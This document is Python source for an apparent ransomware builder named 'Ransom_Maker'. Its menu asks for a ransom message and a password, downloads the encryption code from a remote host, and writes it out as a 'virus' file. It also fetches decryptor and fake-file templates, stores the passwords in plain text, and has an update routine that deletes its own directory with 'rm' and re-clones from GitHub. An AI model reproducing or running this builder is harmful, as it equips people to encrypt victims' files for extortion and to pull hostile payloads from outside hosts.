import os, base64, hashlib, time, urllib.request
b="\033[30m";bb="\033[40m"
R="\033[31m";RR="\033[41m"
G="\033[32m";GG="\033[42m"
Y="\033[33m";YY="\033[43m"
B="\033[34m";BB="\033[44m"
P="\033[35m";PP="\033[45m"
S="\033[36m";SS="\033[46m"
W="\033[37m";WW="\033[47m"
Q=W+' ['+R+'?'+W+']'
I=W+' ['+B+'*'+W+']'
logo=Y+"""                                                ..,:cc,.                                       
                                            .;cldO0XKOxdo,                                      
                                        .,lk0XXXXXKKKOddxko'                                    
                                       'dKXXXXXK00OkkkkkkO0Oc.                                  
                                      'kXKK00O00OOOOkkkkxkk00l.                                 
                                     'kX0OOkkkkxdddxkkOOOkxddxl.                                
                                    .dKKK0OOkxdooddxxdddxxxdooxd'                               
                                    :0K0dc;'.........   ..,cx0OOx,                              
                                   .l0k:.                   .;dO0O:                             
                                   .od;                        .:dOc.                           
                                  .ld,                            ;xc                           
                                 'dxo;                             ;d'                          
                                .dkdxl.                            .o,                          
                                'xxdkx'                            .c'                          
                             .  .cxxxO:                            .,.                          
                        .,coxkkoclkxdko.                           '.                           
                      ,oOKXKKKXK0kkkccd:                          ''                            
                    .lkk0KKKK000Oxxkxolo;.                       ..                             
                   'oOOO00000000kdddddoll:.                     ..                              
             .,;cldxOkOOOkkxkkk0Oxodddoldxo'                   ..                               
         .;cdkOOOOOOOO0OkkO0OkkOOkoxkxxookOd;.              .',.                                
       ,lxkxxxddddxkxooxO0000OxkkkloO0xookOOd:'.         .;oxOkc.                               
     .:ddxkkkd;.:dddc. .,oxxkOkxddllO0o;lxkd;'....       ;OXXXXXd.                              
    .oo:coodo:.  .ll'    .oO00OxddllOO;.lxxoc'.  .       .oXXXXXXx'                             
    cd' ...;,  ...cl.   .l0K00Oxdo:lOk'.ldxxdc,.          'kXXKKXXOl.                           
   .ld,.,ldx:.'odc;,;.  c0Oxoldxxl:oOd..ldxkdol,           'xKKKKKKKk,                          
   ,ddlldxxo,'lddxc',. ,OOxd;..cooodkl..,:dxdl:'            .d0KKK00Xk,                         
  .dOl'lOdo:.l0kdo:    o0xddc.  .:loxl:c:''ld'               .o0KOO00Odl;.                      
  ,kx;'d0dolo00xx:.   'kOxxxo;  ;xxdoooddc.,o:'.              .x0kkOxdk00Oc.                    
  :Okc,xKkoo0KOO0o,.  cKOkkxl;;:lxdoddxkOkc,,;:.               :kkxxddk0000o.                   
  ,OKkcx0kl;xKOO0Ol'..,oddxd:;xOxooccloodkxoccl'               .dOxlclxK0kO0l                   
  .c00olkOk:,xOkO0c':lldOOkkxooxo:,':clooxxxodx,                :OOo,;d0K000c                   
    :kx:lO0x;cOkk0o..;cddlcoo:;:..''cxxxxxdxdool;.              ;k0l.,d0K0Ol.                   
     .;..,odlcoOOOd;';okxc,..;;'..;,;:'..'',,...;c.            .;x0o,cx00x,                     
           ....';,..ckxoool::oo,.. ... .:;....  .;l;.          .:xO:.lkxo:.                     
                    ..''':dxo;:cc,     ;d'    .;lodc.          .cxk;,dxxddo:.                   
                          .,,'';,'''.  .:;...'coo;.            ;odxlokO00000k;                  
                               ....,'....;::,,,..             'xdooldkOOOOkkc.                  
                                  

        ____                                   __  __       _
       |  _ \ __ _ _ __  ___  ___  _ __ ___   |  \/  | __ _| | _____ _ __
       | |_) / _` | '_ \/ __|/ _ \| '_ ` _ \  | |\/| |/ _` | |/ / _ \ '__|
       |  _ < (_| | | | \__ \ (_) | | | | | | | |  | | (_| |   <  __/ |
       |_| \_\__,_|_| |_|___/\___/|_| |_| |_| |_|  |_|\__,_|_|\_\___|_|
       '''
              \033[37m _______________________________________________
              |                                               |
              |      Author :\033[32m Ibrahim Al-Jdaan \033[37m               |
              |                                               |
              |      Send_us:\033[32m python3 send-us.py  \033[37m            |
              |                                               |
              |      YouTube:\033[32m UCemKd0mx1PzSxUrR4YlFPGQ  \033[37m      |
              |                                               |
               ¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯ """       
def update():
    try:
        check=urllib.request.urlopen("https://brojda.000webhostapp.com/ransom-maker/version")
        update=check.read().decode('utf-8')
        version="v1.6"
        if	version==update:
            pass
            maner=1
        else:
            get=input(W+"  There are updates to ({0}) Do you want update?[Y/n] ".format(update))
            if get.lower()=="y":
                name=os.getcwd() 
                os.chdir('..') 
                os.system('rm -rif {0}'.format(name)) 
                os.system('git clone https://github.com/brojda/ransom-maker.git')
                maner=0
    except:
        get=input(W+"  There are updates.Do you want update?[Y/n]")
        if get.lower()=="y":
                name=os.getcwd() 
                os.chdir('..') 
                os.system('rm -rif {0}'.format(name)) 
                os.system('git clone https://github.com/brojda/ransom-maker.git')
                maner=0
    if maner != 1:
        exit()
def download(maner):
    if maner =='encrypt':
        url="https://brojda.000webhostapp.com/ransom-maker/encrypt.txt"
        name=".encrypt.txt"
    elif maner =='decrypt':
        url="https://brojda.000webhostapp.com/ransom-maker/decrypt.txt"
        name=".decrypt.txt"
    elif maner =='encrypt_test':
        url="https://brojda.000webhostapp.com/ransom-maker/encrypt.txt"
        name=".encrypt.txt"
    elif maner =='decrypt_test':
        url="https://brojda.000webhostapp.com/ransom-maker/decrypt.txt"
        name=".decrypt.txt"
    elif maner =='fake':
        url="https://brojda.000webhostapp.com/ransom-maker/fake.txt"
        name=".fake.txt"
    try:
        URL=urllib.request.urlopen(url) 
        with open(name,'wb') as f:
            f.write(URL.read())
    except:
        print (R+"please reload the tool.. ")
def make():
    try:
        global __Data__
        __Data__=open('.encrypt.txt','r').read()
    except:
        download('encrypt')
    try:
        __BodyPath__='body='+'"""'+(open(str(input(Q+' Enter the messege`s path: ')),'r').read())+'"""'
    except:
        print ('The path is incorrect *_*')
        exit()
    password=input(Q+' Entar your password: ')
    __Password__='password='+'"'+password+'"'  
    __Save__=input(Q+' Enter a path to save your virus: ')
    with open(__Save__,'w') as save:
        save.write(__BodyPath__)
        save.write('\n'+__Password__)
        save.write('\n'+__Data__)
    open('.pass_data.txt','a').write('\n  > '+password) 
    print (I+G+' DoN..')
def files():   
    try:
        __Data__=open('.decrypt.txt','r').read()
    except:
        download('decrypt') 
    __Password__='data_password='+'"'+hashlib.md5(input(Q+' Entar your password: ').encode()).hexdigest()+'"'  
    __Save__=input(Q+' Enter a path to save your file: ')
    with open(__Save__,'w') as save:
        save.write(__Password__)
        save.write('\n'+__Data__)
    print (I+G+' DoN..')
def password():
    print(Y,"    The password ^^")
    os.system('cat .pass_data.txt')
def fake():
    try:
        __Data__=open('.fake.txt','r').read()
    except:
        download('fake')
    password=input(Q+' Entar the password: ')
    __Password__='password='+'"'+password+'"'
    __Save__=input(Q+' Enter a path to save your file: ')
    with open(__Save__,'w') as save:
        save.write(__Password__)
        save.write('\n'+__Data__)
    print (I+G+' DoN..')
def test():
    os.system('clear')
    print (logo)
    print (R+'\n      1-Testing the virus\n      2-Testing the decryption\n')
    choice_test=input(Q+' Enter your choice: ')
    password=input(Q+' Entar your password: ')
    __Password__='password='+'"'+hashlib.md5(password.encode()).hexdigest()+'"' 
    __PATH__=('root='+'"'+input(Q+' Enter the path to test it: ')+'"')
    try:
        __BodyPath__='body='+'"""'+(open(str(input(Q+' Enter the messege`s path: ')),'r').read())+'"""'
    except:
        print ('The path is incorrect *_*')
        exit()
    __Save__=input(Q+' Enter a path to save your decrypted file: ')
    if choice_test=='1':
        try:
            __Data__=open('.encrypt_test.txt','r').read()
        except:
            download('encrypt_test') 
    if choice_test=='2':
        try:
            __Data__=open('.decrypt_test.txt','r').read()
        except:
            download('decrypt_test') 

    with open(__Save__,'w') as save:
        save.write(__Password__)
        save.write('\n'+__PATH__)
        save.write('\n'+__BodyPath__)
        save.write('\n'+__Data__)
    open('.pass_data.txt','a').write('\n  > '+password)
    print (I+G+' DoN..')
if __name__=="__main__":
    os.system('clear')
    update()
    print (logo)
    print (W+'\n\t\t~~'+R+'Welcome to Ransom_Maker'+W+'~~')
    print (S+'\n\n\t1-Making your'+R+' ransomware    ')
    print (S+'\t2-Getting your decrypted file')
    print (S+'\t3-Getting your passwords') 
    print (S+'\t4-Getting fake file')
    print (S+'\t5-Generate test file')
    print (B+'\tEnter to Exit--->') 
    choice=input ('\n'+Q+' Enter your choice: ') 
    if choice=='1':
        make()
    elif choice=='2':
        files()
    elif choice=='3':
        password()
    elif choice=='4':
        fake()
    elif choice=='5':
        test()
    else:
        exit()
